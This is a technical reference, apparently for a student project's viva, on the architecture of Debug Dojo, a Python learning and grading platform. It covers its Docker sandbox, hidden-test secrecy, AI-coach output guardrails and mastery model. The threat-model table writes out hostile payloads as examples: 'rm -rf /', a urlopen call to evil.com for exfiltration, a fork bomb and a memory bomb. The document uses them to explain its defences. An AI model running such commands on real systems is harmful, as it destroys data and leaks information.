# Debug Dojo: System Architecture & Viva Technical Reference

This document provides a comprehensive technical breakdown of the Debug Dojo backend architecture, design rationale, threat model, and pedagogical mechanisms for examination and viva voce presentation.

---

## 1. Architectural Philosophy & Principles

Debug Dojo is designed to address a fundamental flaw in automated grading systems and AI coding assistants:
- **Traditional Graders** return binary pass/fail outcomes or raw assertion tracebacks, encouraging trial-and-error guessing without conceptual comprehension.
- **Modern AI Assistants** frequently output complete solution code, destroying the learner's active cognitive debugging experience and creating illusion of competence.

### Core Architectural Guarantees:
1. **Deterministic Authority**: AI (Gemini) **never** decides whether code passes, fails, or has a specific misconception. Deterministic test runners and static AST analyzers retain 100% authority over grading, categorization, and mastery.
2. **Blind Evaluation Sandbox**: The untrusted code execution sandbox **never receives expected outputs**. It evaluates only input parameters and returns raw outcomes to the host.
3. **Defense-in-Depth Containment**: Learner code is assumed to be actively hostile. Code execution occurs exclusively inside ephemeral, resource-constrained, network-isolated Docker containers.
4. **Air-Tight Secrecy**: Hidden test inputs, expected values, tracebacks, and program stdout on hidden tests are prevented by architecture from reaching API responses, database tables, AI prompts, or client files.

---

## 2. Threat Model & Security Architecture

Learner code submitted to `/api/submit` or `/api/mutate` is executed on the server. The sandbox architecture is engineered to counter the following threat vectors:

### Threat Matrix & Mitigations

| Threat Vector | Attacker Action / Payload | Defense Mechanism & Enforcing Layer | Grader Outcome |
|---|---|---|---|
| **Arbitrary Host Execution** | `os.system("rm -rf /")`, subprocess spawning | Container execution, non-root user (UID `10001`), root filesystem mounted `--read-only`, `--cap-drop=ALL`. | `runtime_error` |
| **Privilege Escalation** | `setuid` binary execution, kernel exploits | `--security-opt=no-new-privileges` flag blocks privilege escalation via child processes. | `runtime_error` |
| **Network Exfiltration / SSRF** | `urllib.request.urlopen("http://evil.com")`, reverse shells | `--network=none` disconnects all virtual interfaces except local loopback. | `runtime_error` |
| **Memory Bomb** | Allocating `bytearray(10**9)` or recursive nested lists | Docker `--memory=192m` and `--memory-swap=192m`. OOM-killer terminates container instantly. | `runtime_error` (`limit="memory"`) |
| **CPU Starvation / Infinite Loop** | `while True: pass` or intensive busy loops | Per-test timeout ($2.0s$) via signal/thread watchdog; total container wall-clock limit ($20.0s$); `--cpus=0.5`. | `timeout` |
| **Disk Flood (Space Exhaustion)** | Writing gigabytes to `/tmp` | `/tmp` is mounted as an in-memory `tmpfs` capped at `size=16m`. Writing past 16MB triggers `OSError: [Errno 28] No space left on device`. | `runtime_error` (`limit="disk"`) |
| **Fork Bomb (PID Exhaustion)** | `while True: os.fork()` | Docker `--pids-limit=64` stops thread and subprocess creation at 64 processes. | `runtime_error` |
| **Stdout / Log Flooding** | `while True: print("A" * 10000)` | Subprocess standard output reader in `sandbox.py` enforces a hard `256 KB` read cap and truncates. | `runtime_error` (`limit="output"`) |
| **Container / Process Zombies** | Unhandled container accumulation | Python `try...finally` block invokes `docker rm -f <container_name>` immediately upon return, error, or total timeout. | Clean cleanup |
| **Denial of Service via Load** | Flooding concurrent submissions | `threading.BoundedSemaphore(MAX_PARALLEL_RUNS)` limits simultaneous containers (default 4); extra requests wait in queue. | Ordered 200 OK |
| **Host Introspection Probing** | Inspecting `sys.modules`, `__file__`, or environment | Code runs in container where host files do not exist; expected values are not in memory. | Contained |

---

## 3. Hidden-Test Secrecy Architecture

The most critical intellectual property and evaluation integrity requirement in Debug Dojo is **zero leakage of hidden test data**.

### The "Blind Runner" Architecture

```
Host (FastAPI / Grader)                                Container (Runner)
+-----------------------+                              +-----------------------+
|  Reads challenge data |                              |                       |
|  - visible_tests.json |                              |                       |
|  - hidden_tests.json  |                              |                       |
|                       |  JSON payload via stdin      |                       |
|  Strip expected values| ---------------------------> |  Execute function     |
|  Send ONLY inputs     |  {code, fn, [{id, args}]}    |  on provided args     |
|                       |                              |                       |
|                       |  JSON results via stdout     |  Returns ONLY raw     |
|  Compare results with | <--------------------------- |  value / exception    |
|  host-held expected   |  {results: [{id, val, exc}]} |  (NO comparisons done)|
|                       |                              |                       |
|  Discard hidden stdout|                              +-----------------------+
|  Mask error details   |
+-----------------------+
            |
            v
Public API Response:
{"visible": [...call, expected, got, outcome...],
 "hidden": [{"test": 1, "outcome": "passed", "limit": null}]}
```

### Secrecy Invariants:
1. **Container Ignorance**: The container does not know what expected answer it is comparing against; it cannot leak what it does not possess.
2. **Hidden Output Annihilation**: Standard output captured during hidden test execution is immediately dropped on the host. If an attacker submits `def last_k_total(marks, k): print(marks, k)`, the print output is never forwarded.
3. **Exception Sanitization**: If a function crashes on a hidden test with an exception embedding input data (e.g., `raise ValueError(f"{marks}")`), the exception message is stripped on the host. The hidden outcome is reported strictly as `runtime_error`.
4. **Database Sanitization**: In the SQLite `test_results` table, rows where `kind = 'hidden'` store **only** `kind`, `test_no`, `category`, `outcome`, and `limit_hit`. Argument JSON and expected values are never written.
5. **Prompt Isolation**: AI coach and explanation prompts receive only aggregate counts and category names (e.g., *"3 of 6 hidden tests fail, involving cases where k is larger than list"*), never raw test vectors.

---

## 4. AI Guardrails & Coaching Layer

Debug Dojo integrates Google Gemini (`gemini-2.5-flash`) via `google-genai` to deliver warm, Socratic feedback. However, LLMs are fundamentally non-deterministic and prone to over-assisting.

### Multi-Layer Guardrail Architecture

```
                               +------------------------------------+
                               |     Learner / Diagnostic Input     |
                               +------------------------------------+
                                                 |
                                                 v
                               +------------------------------------+
                               |   Layer 1: Input Prompt Sanitizer  |
                               |   - Hidden test inputs stripped    |
                               |   - Solution reference omitted     |
                               |   - Role & constraints enforced    |
                               +------------------------------------+
                                                 |
                                                 v
                               +------------------------------------+
                               |      Google GenAI (Gemini API)     |
                               +------------------------------------+
                                                 |
                                                 v
                               +------------------------------------+
                               | Layer 2: Output Guardrail Checker  |
                               | (backend/ai/guardrails.py)         |
                               |                                    |
                               | 1. Code Fence Detection (```)      |
                               | 2. Inline Code Threshold (<=2)     |
                               | 3. AST / Solution Keyword Match    |
                               | 4. Hidden Test Token Scan          |
                               +------------------------------------+
                                     /                      \
                         [PASS]     /                        \ [BLOCK / FAIL]
                                   v                          v
                     +-----------------------+      +-----------------------+
                     | Deliver AI Response   |      | Deterministic Safe    |
                     | (Tone-personalized)   |      | Authored Fallback     |
                     +-----------------------+      +-----------------------+
                                   \                          /
                                    \                        /
                                     v                      v
                               +------------------------------------+
                               |      Audit Trail Logging           |
                               | - ai_logs database table           |
                               | - logs/ai_calls.jsonl audit log    |
                               +------------------------------------+
```

### Output Guardrail Specifications:
- **Rule 1 (No Code Blocks)**: Any response containing markdown code blocks (```` ``` ````) is immediately rejected.
- **Rule 2 (Inline Code Restriction)**: A maximum of two inline backtick snippets is permitted, and neither may exceed 30 characters (permitting references like `` `len()` `` or `` `k` `` but rejecting code lines).
- **Rule 3 (Solution Code Suppression)**: Candidate output is analyzed with regex and AST parsing. The presence of `def `, return statements, or variable assignment blocks triggers an immediate block.
- **Rule 4 (Hidden Token Scan)**: Every candidate response is scanned against all hidden test argument and output tokens.
- **Fail-Safe Fallbacks**: If Gemini is blocked, times out, or the API key is not configured, the system transparently falls back to pre-authored, curriculum-tested hint ladders or deterministic category summaries.

---

## 5. Diagnostic Engine & Mistake Taxonomy

When a learner's code fails one or more tests, `backend/engine/mistakes.py` deterministically diagnoses up to two mistake tags in strict priority order.

### Priority Hierarchy:
1. `print_not_return` (Mandatory, Priority 1): Returning `None` when expecting values, while printing to stdout or containing AST `print()` calls without value returns.
2. `mutates_input` (Mandatory, Priority 2): Mutating input arguments in-place as detected by runner deep-comparison.
3. `unhandled_short_input` (Mandatory, Priority 3): Passing all general tests while failing empty, single-element, or zero-bound cases.
4. `boundary_comparison` (Mandatory, Priority 4): Strict inequality errors (`>` instead of `>=`) at challenge thresholds.
5. `off_by_one` (Mandatory, Priority 5): Numeric return offset of $\pm 1$ or length offset of $\pm 1$.
6. `wrong_initialization` (Secondary, Priority 6): Accumulator initialized to non-neutral starting value.
7. `incorrect_condition` (Secondary, Priority 7): Inverted conditional logic.
8. `incorrect_accumulation` (Secondary, Priority 8): Incrementing constant instead of elements.
9. `wrong_return_type` (Secondary, Priority 9): Output type mismatch.

*For complete detection rules, code examples, and AST patterns, refer to [MISTAKE_TAXONOMY.md](file:///c:/Users/Admin/OneDrive/Desktop/debug%20dojo/docs/MISTAKE_TAXONOMY.md).*

---

## 6. Mastery Model & Concept Tracking

Debug Dojo models learner competence using **Exponential Moving Average (EMA)** knowledge tracing across six foundational concepts: `loops`, `lists`, `indexing`, `conditions`, `edge_cases`, and `functions`.

### Mathematical Formulation
$$Score_{new} = Score_{old} + Weight \times (Target - Score_{old})$$

Where initial $Score_0 = 0.50$ (neutral prior), and updates depend on submission performance:

| Submission Outcome | Target | Weight Formula | Pedagogical Rationale |
|---|---|---|---|
| **Pass (0 hints used)** | $1.0$ | $0.30$ | Demonstrates independent mastery; rapid positive convergence. |
| **Pass (with hints)** | $1.0$ | $0.30 \times \max(0.25, 1 - 0.25 \times hints)$ | Rewards solving the problem, penalized proportionally to hint assistance. |
| **Fail (runtime / wrong output)** | $0.0$ | $0.15$ | Concept gap detected; gentle downward correction. |
| **Syntax Error / Crash** | $0.0$ | $0.05$ | Minor mechanical slip; minimal penalty to prevent learner frustration. |

### Inactivity Decay
For inactive concepts on subsequent submissions:
$$Score_{decayed} = 0.50 + (Score - 0.50) \times 0.98$$
Scores regress slowly toward the neutral prior ($0.50$), accurately capturing memory retention decay over time.

*For complete mathematical proofs and sample step-by-step trajectories, refer to [MASTERY.md](file:///c:/Users/Admin/OneDrive/Desktop/debug%20dojo/docs/MASTERY.md).*

---

## 7. Recommender Engine Logic

The recommender system (`backend/engine/recommender.py`) dynamically selects the learner's optimal next challenge based on diagnosed misconceptions and mastery gaps:

1. **Remediation Priority (Targeting Recurring Mistakes)**:
   - If the learner exhibits a recurring mistake tag (diagnosed across $\ge 2$ distinct challenges), the engine queries challenges whose `targets_mistakes` metadata explicitly remediates that misconception.
2. **Mastery Gap Priority (Lowest Mastery Concept)**:
   - If no recurring mistakes exist, the engine selects uncompleted challenges reinforcing the learner's weakest concept ($Score < 0.60$).
3. **Curriculum Progression Priority**:
   - If all concepts show healthy mastery, the engine recommends the next uncompleted challenge by difficulty and sort order.

---

## 8. Known Limitations & Technical Viva Notes

For viva examiners inquiring about production deployment trade-offs:

1. **Container Isolation vs. MicroVMs**:
   - *Current State*: Docker containers share the host Linux kernel. Dropped capabilities (`--cap-drop=ALL`) and unprivileged execution (`UID 10001`) prevent privilege escalation.
   - *Production Recommendation*: Replace Docker with **gVisor** (`runsc` runtime) or AWS **Firecracker** microVMs to provide a dedicated virtualized kernel per execution.
2. **Heuristic Mistake Classification**:
   - *Current State*: Mistake tags are inferred from static AST patterns and test failure categories. Unorthodox programming styles (e.g. implementing counting via recursive lambda functions) may not match standard AST patterns and will receive an empty tag list `[]`.
   - *Trade-off*: An empty tag list is deliberately chosen over guessing to prevent misleading pedagogical advice.
3. **Database Concurrency**:
   - *Current State*: SQLite with Write-Ahead Logging (WAL) and foreign keys handles concurrent reads and non-blocking writes for hackathon scale.
   - *Production Recommendation*: Migrate to a managed PostgreSQL cluster with connection pooling for multi-region or enterprise scale.
